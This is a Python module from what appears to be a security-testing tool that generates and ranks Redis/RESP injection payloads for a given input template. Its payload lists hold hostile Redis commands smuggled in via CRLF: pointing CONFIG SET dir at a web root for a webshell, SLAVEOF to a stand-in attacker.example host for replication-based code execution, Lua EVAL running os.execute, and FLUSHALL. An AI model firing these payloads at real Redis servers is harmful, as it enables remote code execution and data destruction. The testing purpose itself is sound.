"""Redis / RESP injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_redis_context

# The input is an argument: a CRLF is needed to break onto a new command line.
_ARGUMENT_BODIES = [
    ("x\r\nCONFIG SET dir /var/www/html\r\n", "config-webshell"),
    ("x\r\nSLAVEOF attacker.example 6379\r\n", "replication-rce"),
    ("x\r\nEVAL \"os.execute('id')\" 0\r\n", "lua-rce"),
    ("x\r\nFLUSHALL\r\n", "destroy"),
    ("x\r\nSET pwn 1\r\n", "write"),
    ("x\r\nINFO\r\n", "info"),
]

# The input is the command line itself.
_INLINE_BODIES = [
    ("CONFIG SET dir /var/www/html", "config-webshell"),
    ("EVAL \"os.execute('id')\" 0", "lua-rce"),
    ("SLAVEOF attacker.example 6379", "replication-rce"),
    ("FLUSHALL", "destroy"),
    ("INFO", "info"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class RedisCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class RedisMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[RedisCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _bodies(context: Context):
    if context == Context.REDIS_INLINE:
        return _INLINE_BODIES
    return _ARGUMENT_BODIES


def mutate_redis(template: str) -> RedisMutationResult:
    """Generate and rank Redis injection payloads for ``template``."""
    from .analyzer import analyze_redis

    context = analyze_redis_context(template)
    generated = _bodies(context)

    candidates: list[RedisCandidate] = []
    for payload, strategy in generated:
        result = analyze_redis(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                RedisCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return RedisMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
